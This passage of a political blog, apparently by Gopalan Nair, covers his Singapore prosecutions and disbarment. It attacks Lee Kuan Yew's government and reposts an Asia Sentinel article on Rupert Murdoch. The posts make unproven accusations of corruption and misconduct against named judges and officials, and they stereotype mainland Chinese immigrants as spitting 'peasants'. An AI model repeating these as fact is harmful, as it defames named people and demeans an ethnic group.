Belinda Ang Saw Ean.\nThe hearing took 3 days. Throughout the 3 days the judge together with Lee Kuan Yew, clearly refused to allow Dr. Chee Soon Juan any meaningful opportunity to defend himself by disallowing him to ask almost every single question.\nDr. Chee Soon Juan was unrepresented in court because no Singapore lawyer dares to defend a political opponent such as him for fear of reprisals from Lee Kuan Yew and his government.\nAfter listening to this blatant abuse of her judicial office for 3 days from May 26, 2008 to May 28, 2008, I wrote a blog post in my blog Singapore Dissident www.singaporedissident.blogspot.com on May 29, 2008 titled \"Singapore. Judge Belinda Ang's Kangaroo Court\". A copy of the blog post is attached.\nIn particular the Singapore authorities take objection to the sentence in this blog post which reads \"The judge Belinda Ang was throughout prostituting herself during the entire proceedings, by being nothing more than an employee of Mr. Lee Kuan Yew and his son and carrying out their orders.\"\nI was arrested from my hotel by 5 plain clothes policemen on May 31, 2008 and subsequently charged with \"insulting a civil servant\", a provision under the Singapore Penal Code.\nThe word \"prostituted\" in every single English dictionary also refers to someone in authority who abuses it for personal gain. This is what I meant when I wrote the blog post.\nI pleaded not guilty and went to trial on the charge. The trial went on for 8 days. The judge found me guilty of insulting the judge even though the words only appeared in my blog post and even though the words were a correct use of the English language to describe the actions of this judge. I was sentenced to 3 months jail which commenced in September 2008. I was released from jail in November 2008 and was immediately deported. I returned to US immediately.\nWhen I had arrived in Singapore in May of 2008 and was arrested, my American passport was confiscated. The above trial only occurred in September 2008.\nImmediately after arrest I was kept in solitary confinement at the police station for a week and interrogated day and night. They first accused me of sending Emails of this blog post to various important people including this judge.\nI denied ever sending any Emails to anyone. I believe the Singapore government themselves arranged to send these Emails and confront me with it. The mistake they did was the Emails had my name as palllichadath.nair.gopalan@yahoo.com, instead of nair.gopalan@yahoo.com.\nI had dropped the use of the name Pallichadath (full name Pallichadath Gopalan Nair) which was my first name at birth and changed it to Gopalan Nair when I got my American citizenship. Obviously Singapore's secret agents failed to notice this.\nEven though I was arrested in May 2008 in Singapore, the Singapore Law Society did not commence any disciplinary proceedings against me, either then or even after I was jailed in September 2008. These disciplinary proceedings were commenced only in early September 2009, 1 year and 5 months after the incident.\nThe US State Department in their 2009 Singapore Country conditions report states that reliable sources believe that the reason for their commencing these disciplinary proceedings 1 \u00bd later was because I had withdrawn the apology I had given in the Singapore court and reneged on my promise not to attack their courts or their government. (Please see 2009 State Department Singapore Human Rights and Country Conditions Report released in 2010).\nCharge 2 and 3: After I was arrested for Charge 1 above in May 2008 and while waiting for my trial in September of 2008, I was out on bail. I am sure they deliberately delayed the case with the intention of causing me severe financial hardship, having to be away from my home in California and my law practice for all this time. Financially I was ruined as I had to pay for accommodation while there with no income coming in. My law practice here was suffering and I was lucky I could recover after my return in November 2008.\nAnyway, during this time, in July 4, 2008, American Independence Day, I was walking along a street in an area known as Little India in Singapore on a road called Race Course Road towards the Junction of Bukit Timah Road at about 8.30 pm.\nAt the junction of Bukit Timah Road I heard some people shouting at me from behind. Since it did not concern me I did not look back. Suddenly some 5 people in civilian clothes confronted me, shouting at me and asking me if I had knocked their police car.\nI had seen a police car some 100 or 200 feet behind me while walking. I denied doing any such thing, after which they began to ask me who I was and for my identification. Since I did not know who they were I simply refused.\nThe next minute I was tackled to the floor by a Malay man who used great force and pinned my face to the floor, damaging my spectacles and causing me injuries. I was arrested and taken away in the police car.\nSubsequently I was charges with shouting obscenities at the men, who it turned out happened to be policemen and the second charge was the accusation that I had behaved in a disorderly manner.\nThe case went on for 18 days during which time I cross examined the police men. The only witnesses in court were all the police officers, who repeated parrot fashion, what the earlier one had said.\nWhen I had asked the police officer what he meant by saying that I was disorderly and asked for a demonstration, he gently waved his hands up and down.\nThere was a Singapore newspaper report the next day (all Singapore newspapers are state controlled) which claimed that there were at least 25 bystanders who witnessed my arrest as it was in a public place. The government did not produce a single one of them as witness at trial.\nI was found guilty on both charges and given the maximum punishment of $2,000 for the yelling at policemen charge and $1,000 for the disorderly behavior charge, making it $3,000.00 in all. I paid the fine\nI have denied doing any of this.\nCharge 4: While I was in jail in relation to charge 1 above, I was due to be released on September 26, 2008. Around September 12, 2008, while I was in jail and about 1 week to go before my release, I was visited by police officers.\nThey told me that I am being charged now for contempt of court. They told me that the accusations were that during my trial in Charge 2 and 3 above; I had made some statements that were contemptuous of the court.\nIt is true that I had told the judge in open court that these proceedings were politically motivated, that I had no confidence in the fairness or impartiality of the court and that these proceedings were being brought against me just because I am Gopalan Nair and a Lee Kuan Yew government critic.\nDuring the trial itself, the judge did not find me in contempt of anything. However for the first time, after the proceedings were over and I had paid the fine, while I was in jail and waiting to be released a week later, they accuse me of being in contempt of court at this earlier trial.\nI was taken to court in chains and shackles from the prison. I knew that if I contested these new charges of contempt, there was a strong likelihood that my imprisonment would be lengthened and I would not get out in a week.\nSo I apologized. The prosecutor asked me to read out the apology in the way they wanted which I did. Another condition of the court was that I was never to attack the Singapore judiciary again, which I agreed. I had earlier written 2 blog posts in my blog about my proceedings in court while in Singapore, relating to this matter.\nThe prosecutor wanted me to delete them as a condition for their lenient. I agreed. Upon my accepting these conditions and unconditionally apologizing in Court in the way they wanted, the court did not impose any more jail time and just gave me a warning.\nI believe the judge said that I did the right thing. Frankly I had no intention of keeping my promise. This was not a court of law, it was a political lynching.\nThe moment I returned to California after I was deported in late November 2008, I wrote a blog post withdrawing my apology and reposting the 2 blog posts that I had taken down under duress while in a Singapore prison.\nThis charge relates to contempt of court for their court order by my withdrawing the apology given to the court and re-posting the 2 blog posts.\nCharge 5 : During May of 2008, while the case of Defamation lawsuit Lee Kuan Yew vs Chee Soon Juan was going on in the High Court, the police discovered 3 men, who were members or supporters of Chee Soon Juan's political party, the Singapore Democratic Party wearing T-shirts with pictures of Kangaroos in judicial robes. I believe they tried to enter the courtroom but were refused by police officers.\nEven though they were not even within the court premises of Judge Belinda Ang Saw Ean's court which was hearing the case, they were all arrested for contempt of court merely for wearing T-shirts with pictures of kangaroos in judicial robes.\nAfter their arrest and long periods of interrogation, they were eventually brought to trial in November 2008. I attended their trial. The judge this time was Judith Prakash. The judge sent them to jail for about a week each just for wearing these T-shirts. This is all they did, just wearing the T-shirts.\nThis was patently unjust.\nImmediately after I retuned to the US in November 2008, I wrote a blog post titled \"Singapore's High Court Judge Judith Parkas shamelessly abuses the law in the Kangaroo T shirt trial\" dated Feb 26, 2009. In it I used almost the same words I used in the Charge 1 case above. This last charge refers to my writing this blog post. A copy of it is attached.\nThe reasons for all these cases\nThe Singapore government and their Law Society which is an integral part of the government has brought all these disciplinary charges nearly 1 \u00bd years after the incident in May 2008. And after they commenced the cases in September 2009, it took them another 1 year and 10 months after that to bring it to trial.\nThese charges were initiated and I have been punished because of who I am, not what I did.\nThe Singapore government under Lee Kuan Yew rules the island of 5 million people through fear. Anyone who dared to challenge them are to be punished and forever hounded and persecuted. I have been one of his well known critics and they have to silence me. I have been writing my blog from the US since 1996 but when I stepped into Singapore in 2008 and wrote from there, they had arrested me. I suppose they are trying to silence me and in the process use it as a warning to others not to criticize.\nThe above is a short explanation of the events. If there is a need to elaborate more or if any further information is needed, please let me know.\nMy arrest in Singapore and these proceedings are now a matter of public interest and followed by many around the world. Therefore I have taken the liberty to publish this letter in my blog Singapore Dissident, www.singaporedissident.blogspot.com. I hope I have your permission to do this.\nThe following people are the interested parties in this matter:\n1. The law Society of Singapore\nwww.lawsociety.org.sg\n39 South Bridge Road\n2. Attorney Generals Chambers Singapore\n1 Coleman Street\n3. Minister for Law\nK Shanmugam\n100 High Street, #18-02\nEmail: contact@mlaw.gov.sg\n4. The Judges who heard the case on July 25, 2011 and disbarred me: Lee Seiu Kin, Tan Lee Meng, Tay Yoong Kwang\nAll of Singapore High Court, 1 Supreme Court Lane, Singapore 178879 Tel: (65) 6337 8191\nLastly I would be happy to provide any further evidence or information on this matter.\nExecuted by Me, Gopalan Nair, under penalty of perjury this 25th day of July 2011, in Fremont, California.\nSigned Gopalan Nair\nSingapore. Gopalan Nair, disbarred from practicing law in Singapore, and none the worse for it! Cheers!\nSingapore's state controlled newspaper, the Straits Times of July 25, 2011, just a few minutes ago, reports in it's headlines, \"Lawyer gets life-time ban for \"scandalizing the courts\"\". I have just had the honor of never ever practicing law, in Lee Kuan Yew's Singapore courts.\nOrdinarily, this news would have occasioned some sadness, that is, if one were to be punished this way by an ordinarily respectable legal system. But it is different here.\nThis is the same legal system that had disbarred the late respected lawyer JB Jeyaretnam, not because he did anything wrong, but because he had the temerity in Lee Kuan Yew's Singapore to criticize him or the government.\nIt is also the same legal system that awarded Lee Kuan Yew and his family several million, repeat several million dollars in libel award against Tang Liang Hong, just because he criticized the same individual at an election rally in 1997 in Singapore. Tang had since fled the island and now lives in exile in Australia, beyond the clutches of Lee Kuan Yew.\nAnd this same court that has come down with a life time disbarment against me is the same one that has repeatedly awarded hundreds of thousands of dollars against Dr. Chee Soon Juan resulting in his bankruptcy and loss of employment all because he too had the courage to stand against this same man, Lee Kuan Yew.\nIf one really thought about it, this puts me among great men, JB Jeyaretnam, Chee Soon Juan and Tang, all heroes and martyrs because they too were all punished just as I am today for speaking against this dictatorship which has hijacked the law courts and everything else there.\nAnd as expected of any banana republic such as this that governs by intimidating it's citizens with only the compliant lot left intact in the island, while those with any self respect have all cleared off to Australia and elsewhere, this newspaper report is riddled with lies and half truths.\nIt says the disbarment was for \"scandalizing the (Singapore) courts and conduct not befitting a lawyer\". But it does not say that the \"scandalizing\" as they call it, was a blog post in this blog about the disgraceful conduct of one of their judges Belinda Ang Saw Ean titled \"Singapore. Judge Belinda Ang's Kangaroo Court\" dated May 29, 2008.\nRead the blog post yourself. Every single sentence written there is correct and I stand by it. And as for the words used \"prostituting oneself\" every single dictionary gives the meaning of the words as someone who abuses her authority or office for an improper purpose. There this judge Belinda Ang Saw Ean misused and defiled her office of a judge, to grant the decision to Lee Kuan Yew against Chee Soon Juan.\nAs for conduct not befitting a lawyer, they clearly avoid any details. Very convenient. I will tell you what they are. In one case I was accosted by some Lee Kuan Yew's thugs in plain clothes and claiming to be police officers claiming that I had knocked on their police car, and wanted to know who I was. Upon my refusal to cooperate, they arrest me causing me injuries, and charge me with hurling obscenities at them and behaving in a disorderly fashion, which the police officer at trial demonstrated as waving my arms! If you believe all that nonsense.\nThe other matters were another blog post written about another one of their Kangaroo Judges, Judith Prakash who coincidentally sends 3 young men to jail for wearing Tshirts with pictures of kangaroos on them (please see my earlier blogs on them) and for deliberately defying their court order not to criticize them anymore, as if such a court order demands any respect.\nThe this state controlled newspaper report says that I \"was not present (in the Singapore court) even though he had been invited to defend himself\". I am afraid once again they are conveniently hiding the truth. At present, there are many more events for which I could be arrested if I returned to Singapore. For one, I could be charged for contempt of court for deliberately defying their court order not to criticize after my return to the US. Second, I could be charged for writing the blog post about Judge Judtih Prakash which I wrote from the US. And third I had written countless blog posts criticizing their kangaroo judges and their legal system from the US.\nThis means of course that the moment I step into Singapore, I will be arrested again and charged with all these cases, thrown in jail and the key thrown away as well. You can appreciate that anyone with a head on his shoulders would not want to invite such an adventure.\nIf in fact they were serious of letting me defend myself in this case in Singapore, they would have given me the guarantee of safe passage in and out of Singapore which I had requested repeatedly from the Attorney general, Singapore Police, Minister for Law and the Singapore Law Society. If in fact they were concerned of this case being seen to be done fairly, the proper thing to do would have been to give me the guarantee that I had asked. They never replied to any of my letters.\nYou can see why anyone in their right minds would have avoided ever returning to Singapore under these circumstances.\nAnd then they get their facts wrong too. They say I was sentenced to 3 months jail for \"contempt of court\". That is not correct. The sentence was for \"insulting a judge\", a law in their Penal Code, in this case Belinda Ang Saw Ean in my blog. Whether it is an insult or whether it is an accurate account of what happened is something you can judge for yourself.\nAs for my leaving Singapore for the US, they write \"although he has stopped practicing here, he has remained on the rolls\". This implies that I had deliberately maintained my status in Singapore. This again is another half truth. If one leaves the country or stops practicing, your name remains on the rolls in Singapore by default. I did nothing to facilitate it.\nThen it says \"he had also in 1992 been suspended from practicing law for 2 years for remarks about former attorney general Tan Boon Teik\". Again another half truth. I had written 2 letters to him for an explanation relating to JB Jeyaretnam's request for a pardon. Nothing wrong in that, for which I was suspended for 2 years. The real reason for suspending me was of course to silence me and to destroy my career and remove me from politics. Please see my recent blog post here of July 23, 2011, titled \"Law Society of Singapore vs Gopalan Nair, a demand for harsher punishment on July 25, 2011 trial because I continue to criticize\" on the details of that matter.\nLastly the title itself is incorrect when it says \"Lawyer gets life time ban for \"scandalizing the courts\"\". This statement is true only as long as Lee Kuan Yew's dictatorship which uses the law as a political tool remains in power. From the way things are going in the island, I don't think it is going to take long before these Singaporean kangaroo judges are kicked out or Lee Kuan Yew and his government say by bye for good.\nWhen that happens, I not only expect to be reinstated to the Rolls of Singapore lawyers, I would expect the new democratic government of the country to offer me honorary Singapore citizenship for the work I have done for the cause of freedom there.\nAnd lastly, I have to thank Lee Kuan Yew's Singapore for taking all this trouble to have me disbarred. It is already headlines in the state controlled newspapers there, and this news will be reported in all radio and TV stations. This keeps the actions of Gopalan Nair against the Lee Kuan Yew government alive in the island. This helps to keep Gopalan Nair and my activism always fresh in the minds of Singaporeans. I may be an American citizen now, but I can assure you I will continue agitating for the cause of freedom in the island.\nSingapore. Running a country on false pretences\nSingapore's Lee Kuan Yew is simply running a country on false pretences. It may have worked when Singapore was an island backwater before the days of the Internet. But today this sort of thing, trying to fool locals as well at foreigners into thinking it is something else simply does not work.\nConsider the effects of disbarring me from practicing law in Singapore because I criticized his judge Belinda Ang Saw Ean in 2008. In this blog since then till now, it cannot be any clearer the disgrace that she was up to in court. I know it, anyone in Singapore or the rest of the world who wants to know it, knows it, which is why their actions look very silly. Which by the way has painful consequences to their governance. A government needs respect, not fear from it's people. Here, Singapore's courts lose respect, and by extension their government loses respect.\nAnd in my case, what is even worse for them is the fact that anything they do in Singapore cannot affect me one bit. I practice law in California, USA, where the US Constitution is enforced to the letter.\nEvery single aspect of their government is simply put, fraud. They claim they have the rule of law. Yet they routinely use their courts to sue and punish their critics.\nThey claim to have a free press. Yet their entire media is state controlled.\nThey claim to have racial equality. Yet Malays and Indians are discriminated in housing, jobs and in business, while ethnic Chinese are preferred.\nThey claim they have equal opportunity. Yet those connected to the government ruling party are preferred while those unconnected are neglected.\nThey claim there is no corruption. Yet the most blatantly shameless corrupted individuals are the leaders themselves, who earn a salary of $3.7 million each a year. On top of that, they conceal government accounting figures and routinely siphon off millions. If anyone criticizes, they are sued and bankrupted and even sent to jail.\nThey claim they have freedom of speech and expression. Yet anyone who does any of these things is jailed and harassed for life.\nThey claim that Lee Kuan Yew has stepped down and his son runs the show. Does anyone believe that? I don't think so.\nI can go on. You get the picture by now. The entire island is one big rip off, and the poor Singaporeans who are well aware of this are kept in check through fear. Once in a while they get a victim such as Gopalan Nair who criticizes them who is then immediately charged and punished. These actions are not just intended to silence the individual but much more to send a message to others not to do what I did.\nThey call it the deterrent. But a more accurate description for it is the exercise of instilling fear in Singaporeans. Fear is the principle tool that enables Lee Kuan Yew and his family and friends to pay themselves millions of dollars of tax payers money and get away with it.\nBut this is where the problem lies for Lee Kuan Yew and his sort. Twenty years ago, when there was no Internet, he could have done all these things to me, and accused me of being a serial killer and people would have believed it. Since the newspapers are all controlled, there would have been no way for me to tell my side of the story. But today all that is different. Each time they tell a lie, there will be a response, which will be read by those who care to know. Dictatorships do not have it their way anymore.\nLet me tell this tin pot dictatorship this. Truth is the truth today. It cannot be manufactured. And the second universal truth is, that most human beings anywhere in the world are principally made good, not bad. You may have a few out there who would grovel at your feet, like the disgraceful judge Belinda Ang Saw Ean because there is money in it, by prostituting her office for personal gain. But by and large, human beings will not be prepared to live like that.\nThat is why today, partly assisted by these disbarment proceedings against me, thank you very much, thousands and thousands of educated skilled Singaporeans are saying bye bye to Lee Kuan Yew's Singapore for settlement in the West.\nThat is why despite every single effort made by the government, the people are not having enough babies. And neither are they marrying. And with already a tiny neglible population, there is not going to be anyone left, except of course for Chinese human imports from mainland China.\nThat is why hordes of Chinese from mainland China are being brought in, uneducated peasants, who walk around Singapore spitting and gesticulating like beggars, because they simply cannot find capable cultured people to come to an island such as this, which stands disgraced as a puny tin pot dictatorship.\nThat is why the government has to squeeze every single penny from Singaporeans in all sorts of taxes because they have run out of profitable industry, leaving only gambling and profits from selling landed property to millionaire Indonesian bank cheats and Burmese drug lords.\nWhat any country needs are the people to do the work and manage the country. They unfortunately are the very ones leaving in droves and simply importing mainland Mandarin speaking peasants is not going to do the trick.\nOf course if I stop writing this and if everyone else does so, the world and the locals as well may be kept in the dark like how it was in the bygone days. But since I am determined to continue writing as is everyone else, I can only say Lee Kuan Yew and company are living in denial.\nI would tell them that this is not the way. But I don't think they are going to listen.\nLaw Society of Singapore vs Gopalan Nair, a demand for harsher punishment on July 25, 2011 trial because I continue to criticize\nI have just received an Email with court documents from Singapore Law Society titled very appropriately \"Plaintiff's skeletal submissions\". If they carry on in this manner making a fool of themselves in these proceedings, they will in deed turn into skeletons.\nTheir legal profession has been reduced to less than 3,500 lawyers or so, caused by resignations en masse because anyone with any self respect wants nothing to do with a profession that is used as Lee Kuian Yew's political weapon.\nThe island itself is turning into a skeleton, as far as it's valuable skilled citizenry goes, as mounting emigration has turned into a flood for Australia and the West. The vacuum is being filled by Chinese peasants from China who have no knowledge of English, let alone any skills.\nThe Law Society of Singapore which is in effect an arm of Lee Kuan Yew's Singapore government, asks that I be disbarred from practicing law in the island for the following reasons:\n1. It says the 1992 order against me, of suspension from practicing law in Singapore for 2 years appears to have no deterrent effect upon me.\nAs a recap this is what happened in the 1992 case. Recall JB Jeyaretnam was found guilty and struck off the Singapore Bar on Lee's trumped up charges, namely check fraud and making a false affidavit relating to it. When JB Jeyaretnam appealed his striking off to the appeal court in London, the House of Lords, they not only categorically stated that JB Jeyaretanm was not guilty of anything, they also said Lee Kuan Yew's Singapore government was guilty of deliberately misusing the law to hound harass and punish an innocent man who was not guilty of anything. You can call it a slap right across the face of Lee Kuan Yew and his so called Rule of Law.\nWhen JB Jeyaretnam landed at Changi Airport jubilant on his return from London, London's Privy Council judgement in hand, there was a crowd including me ready to welcome him. Immediately, since the highest court of the land had declared him innocent, he wrote an appeal to the President of Singapore for a pardon.\nThe Attorney General of Singapore then, Tan Boon Teck, on behalf of the Singapore President refused the pardon, stating among other things that Jeyaretnam had committed serious offenses, even though just a few days ago, the London Appeal court had declared him innocent! Furthermore another reason for his refusal of a pardon was because Jeyaretnam had not shown \"remorse, contrition or repentance for the crimes he had committed\" although it beats me how someone could show any of these emotions for crimes he never committed!\nAnother of this reasons for the pardon refusal, was that he was \"not given an opportunity to appear\" at the London hearing. This statement was patently false. One of the judges at the appeal in London, I believe it was Lord Bridge, had specifically asked the lawyer for the Singapore Law Society in court whether the Singapore Attorney General was aware of the proceedings and whether he had applied to intervene. Only after the lawyer had specifically stated that they were aware and had not made any application to intervene, did the court proceed in their absence. In the light of these facts, it was impossible for Singapore attorney General to say \"he was not given an opportunity to appear\".\nI read these ridiculous reasons for the Attorney Generals refusal of the pardon in the Straits Times, a Singapore state controlled newspaper.\nI wrote a letter to the Attorney General asking that he explain his claim that he was not given an opportunity to appear. His reply was that he was not a party to the case, and that if I wanted any information, I should write to Jeyaretnam himself. Not satisfied with this answer, I wrote again to him that I demanded a proper answer within 14 days, and failing that I will distribute this correspondence between him and me to the entire Singapore legal profession.\nHis response was that I had falsely accused him, that I had \"threatened\" him and therefore he was reporting me to the Law Society for discipline. I understand that the Law Society had themselves decided that I had not committed any wrongdoing but as there was a procedure in place where the Attorney General could insist on proceedings regardless of the Law Society's findings, that is what he did.\nThe proceedings against me commenced in 1989 or 1990. The disciplinary proceedings was heard by the late retired judge Choor Singh who was willing to bend over backwards or even forwards if it pleases Lee Kuan Yew. The hearing itself was interesting. The late Jeyaretnam was my counsel. Madan Assomull who was clearly working in tandem with the judge was, expectedly, getting his way over everything. In fact the case turned out as a battle between JB Jeyaretanm and his arch enemy the Attorney General who was the principle witness for the prosecution, much less about me, which by the way I did not mind at all.\nThere was one hilarious moment which I will never forget. One of our main witnesses at trial was Martin Thomas QC, who practices in London, JB Jeyaretnam's lawyer at his London appeal who was kind enough to appear at my Singapore trial, as he happened to be in the vicinity by chance, either on his way or returning from vacation at Tioman Island, Malaysia.\nThomas told the court that the London judges had asked counsel for the Singapore law Society whether \"the Singapore authorities\" were aware of the proceedings, not specifically whether the Singapore Attorney General was aware. Pouncing on this as an opportunity, Assomull began repeatedly asking Thomas QC, whether the Judges could have meant someone other than the Singapore Attorney General, since after all they used the words \"Singapore authorities\", not \"Singapore Attorney General\".\nAfter a point Thomas had had enough. He replied \"Of course the judges meant the Singapore Attorney General when they said Singapore Authorities. I don't think they were interested to know whether the Hong Kong Fire Brigade were interested in these proceedings\"! That was the end of this line of questioning for Assomull!\nIn any case the Law Society found me guilty, in 1991. At that time I had decided I wanted nothing more to do with a legal profession such as this, and packed my bags and left for San Francisco, California in December 1991. While I was already in the USA, in 1992, this case went before the High Court of Singapore in absentia, which confirmed the judgement. Judges Yong Pong Howe, G Pannirselvam and another Chinese judge, whose name I cannot remember, ordered that I be suspended from practicing law for 2 years. This suspension really did not effect me, since I was already in the USA. At the time I was also a member of the English Bar up till now in good standing.\nComing back to the present case against me, the Singapore Law Society states that one reason why I should be disbarred from Singapore is because \"the previous order of suspension in 1992 had no deterrent effect on me as seen from my further blog posts\".\nLet me remind the Singapore government that a man will be deterred by punishment only if he knows that he did something wrong. Since I did no wrong in the 1992 matter, I see no reason why I should be deterred. They further say \"the Defendant had shown no remorse (the 1992 matter) for his misconduct\". True I have no remorse. It is an oxymoron to demand remorse for completely lawful, nay admirable conduct.\n2. In another part, they say it is necessary to have me disbarred \"to protect the good name of the Singapore profession\". I am not sure how many ordinary people out there would agree that the Singapore legal profession has any name at all, let alone a good name.\n3. There are various other portions where it states such things as \"using offensive language is unbecoming\" which I have denied ever using at anyone (I believe they are referring to the yelling at policemen charge), and that according to them I lack the qualities of a lawyer.\n4. As an authority to disbar me for contempt of court, they refer to the 2006 case of Chee Soon Juan, Herzberg Daniel in 2009 (I don't know who he is) and the recent case of Alan Shadrake who was sent to jail for 6 weeks. I would have thought that if these are the only cases they rely on, Chee Soon Juan and Alan Shadrake, both well respected men of principle, morals and courage, I should be applauded, not punished. Of course this is not how a morally bankrupt country is expected to behave or think.\n5. Another reason they say that I should be disbarred is the fact that I was sent to jail for 3 months for criticizing Judge Belinda Ang Saw Ean! You can see for yourself here whether I should have been jailed for having written what I did about Belinda Ang Saw Ean.\n6. Further, they rehash want has been said so far, that a) I had repeatedly committed contempt of court 2) that I had undermined the judiciary on 3 different occasions in 6 months 3) that I had breached the undertaking I had given to the Singapore judge 4)that my \"cavalier\" attitude can be seen from my blog posts 5) that I persist in undermining the Singapore judiciary in my blog posts.\n7. They attach with their document my recent blog post dated July 16, 2011, \"Law Society of Singapore vs Gopalan Nair, trial date July 25, 2011. A brief rehash of what it's about\"\nFrom these proceedings, I am not sure whether Singapore is aware of whom they are dealing with or are they deliberately trying to pretend not to know who I am. I would like to tell them this. They are dealing with a man who is not prepared to live a life in submission to Lee Kuan Yew because I really do not have to. I live in a free country and practice in a jurisdiction where there is the rule of law, where I do not have to live my life saying one thing in public and another in private. And there is no need for me to pretend that Singapore has the rule of law when it has none, and neither can anyone force me to do it.\nAnother thing they fail to understand that not every lawyer in the world are the sort you find in Singapore. No lawyer from any other democracy will be prepared to submit to a jurisdiction such as this and respect it when it has no integrity whatsoever.\nYour Singapore courts can do and say anything you want. I am judged not by you, whose judgements don't mean a thing but by the real courts of the world, such as those in the USA and the UK.\nAnd finally, since the bad guys, according to the Singapore government in their submission, are Alan Shadrake, JB Jeyaretnam and Chee Soon Juan whose cases are used to justify disbarring me from Singapore law practice, I should have no complaints whatsoever, as I would be among such illustrious men; heroes such as this. Tell me how many of you out there can claim to be compared to Chee Soon Juan, JB Jeyaretnam or Alan Shadrake? I should be proud. Very proud indeed.\nI am writing this at 6.40 pm on Saturday, July 23, 2011, which is 9.40am Sunday morning July 24, 2011. My case will be heard in the High Court Singapore on Monday morning Singapore time tomorrow. I have an airline ticket departing tonight midnight San Francisco, which I am still contemplating using, which will take me into Singapore early morning Monday the day of the hearing.\nI am toying with the idea of whether to come. It is only a short 30 minute drive to San Francisco Airport's long term parking along 880 North Freeway, San Mateo Bridge, 101 North Freeway, past San Carlos Airport and into San Francisco Airport, park and into the International Terminal. I may or may not come. If I do, I will walk into the courtroom precisely 5 minutes before 10 am.\nAs the Singapore government appears to read every word written here, they have been warned.\nThe Asia Sentinel on the disgraced Rupert Murdoch and his praise of Singapore\nI append below, courtesy of the Asia Sentinel, a report criticizing Rupert Murdoch's praise of Lee Kuan Yew's Singapore as a paragon of good government.\nSingapore: Murdochian Democracy?\nTag it:Written by John Berthelsen\nRupert says the lion city is his version of utopia\nProbably the most telling statement the press baron Rupert Murdoch made during his abject mea culpa before the UK Parliament Tuesday was his praise of Singapore, saying \"the most open and clear society in the world... is Singapore -- the cleanest society you can find anywhere -- as every minister is paid at least one million dollars a year and has no temptation to transgress.\"\nWhat that statement betrays is that Rupert Murdoch appears to have no basic understanding of either independent journalism or democracy itself.\nTransparency International's Corruption Index ties Denmark and New Zealand with Singapore at the very top of its corruption perceptions index. Leave aside the question of what the lawmakers of Denmark and Sweden are paid to maintain their integrity \u2013 a fraction of what Singapore ministers get.\nWhat keeps Singapore's ministers in line is not those million-dollar paychecks but the fact that they are scared to death of Lee Kuan Yew, who has shown no compunction whatsoever in jailing the odd minister who does stick his hand in somebody else's pockets. In 1986, Teh Cheang Wan, one of Kuan Yew's best friends, a co-founder of the state and the head of the country's national development ministry, committed suicide rather than face corruption charges that Kuan Yew was intent on bringing against him. Also leave aside the fact that the PAP has historically delivered a supine parliament mostly via gerrymandering and intimidating the opposition.\nThe leader of the world's most powerful news organization, who presumably ought to believe in the independence and freedom of the press, was praising a country that most recently jailed the author Alan Shadrake for pointing out that Singapore's criminal justice system is skewed towards hanging the poor and finding ways to excuse the wealthy and expatriates. Singapore has the highest per-capita rate of executions in the world.\nIt seems odd that Murdoch didn't notice that Reporters Without Borders ranks Singapore at 140th of 167 countries in terms of press freedom, or that Time Magazine, Asiaweek, the Financial Times, the International Herald Tribune, The Economist, Bloomberg News Service and other publications have been cowed into submission through libel suits, contempt of court action and gazetting to limit their circulation. It is especially odd that Murdoch owned two of them \u2013 the Far Eastern Economic Review, before it closed, and the Wall Street Journal/ Asia. Those that haven't been sued or otherwise attack have learned their lesson and simply don't report critically on the country.\nThe country's own media dare not report what happens in Singapore beyond what the leaders want to see in print. And what has happened, considering the practice of democracy and free elections, is nothing short of appalling.\nAccording a chronology compiled by the website New Asia Republic, since 1994, in addition to suing newspapers on the thinnest of pretexts and winning all of its cases in its own courts, police have raided private homes and arrested members of churches it doesn't like.\nFormer Prime Minister Goh Chok Tong once threatened to turn constituencies into slums if they didn't vote for the ruling People's Action Party. Both opposition leaders Chee Soon Juan and the late JB Jeyaretnam have been sued, charged with perjury and defamation and hounded with a variety of other offenses in an effort to drive them out of politics. Opposition leaders' homes and offices have been stormed by Inland Revenue officials who carted away tons of documents and articles to seek to make cases for tax evasion.\nAccording to the US State Department's human rights report on Singapore, it is \"widely believed that the authorities routinely conduct surveillance on some opposition politicians and other critics of the government.\" The same report also stated that the Internal Security Department is believed to run a network of part-time informants in the US, Australia and other countries.\nPolitical films and videos have been banned. Foreign television stations and networks have been asked to restrict covering of small political parties and warned against critical reporting of the country. The police have been given lawful access to data and encrypted material. CD-ROMs have been added to the Undesirable publications Act.\nIn 1999, the Home Affairs Ministry admitted that it had secretly scanned the computers of more than 200,000 Internet users. Even women's magazines have been warned not to get involved in partisan matters. Public rallies by the opposition have been banned repeatedly. Falun Gong members have been arrested.\nIn 2001, the Parliament passed a law that allows punishment of foreign news broadcasters deemed to be \"engaging in the domestic politics of Singapore.\" Political campaigning has been restricted on the Internet. Election time for campaigning has been as short as 17 days. Police have raided Internet critics' homes and confiscated their computers. In 2002, the supposedly independent courts ruled that there would be no trial for defamation suits brought by Goh Chok Tong and Lee Kuan Yew against opposition leader Chee Soon Juan. He was found guilty by summary judgment.\nNor does Murdoch appear to have noticed that Singapore, this paragon of integrity, is home to vast amounts of the stolen wealth of both Burma and Indonesia. Some 18,000 Indonesians described as \"rich\" were living in Singapore in 2007, according to Tempo Magazine, worth a combined total of US86 billion. Some US$13.5 billion of that alone was looted from the Indonesian central bank's recapitalization lifeline to 48 ailing banks during the 1997-1998 Asian Financial Crisis.\nBurma's generals, who have beggared their country and savagely repressed their citizenry, are believed to have transferred nearly US$5 billion into two Singapore banks from the sale of gas since 2000, according to Earth Rights International. One of their generals has even had a rose named after him in the Singapore Botanical Gardens.\nAside from whether the old lizard was crying crocodile tears in his testimony when he said he and his top executives knew nothing of the fact that his employees had hacked into hundreds of voicemails up to and including the royal family, his apparent admiration of Singapore speaks volumes about his own corporate empire.\nIf this is what he believes about the foundations of democracy \u2013 that mere money will bribe politicians to stay out of trouble \u2013 then there are few moral imperatives that guide his stewardship of the press. It is okay for Fox News in the United States to hire Republican presidential candidates and give them a nationwide forum while \u2013 in Fox's famous slogan \u2013 they report, the viewers decide. It is okay for a putatively neutral news organization to virtually dictate who will be in power in the UK.\nIt was okay for him to make a fire-breathing speech in 1993 to London advertising executives that communications technology would allow dissidents to bypass state controlled media and that satellite broadcasting would make it possible \"for information-hungry residents of many closed societies to bypass state-controlled television channels. \u2026 The Bosnian Serbs can't hide their atrocities from the probing eyes of BBC, CNN and Sky News cameras \u2026 the extraordinary living standards produced by free-enterprise capitalism cannot be kept secret.\"\nBut it also appears to have been okay to cravenly back away from that statement when it appeared that it enraged the Chinese authorities who had direct control over his Star TV footprint in Asia, and to court them in every way possible. He dropped the BBC from programming after he heard that BBC news offended the Chinese government, then tried to claim it was a business decision. A Murdoch 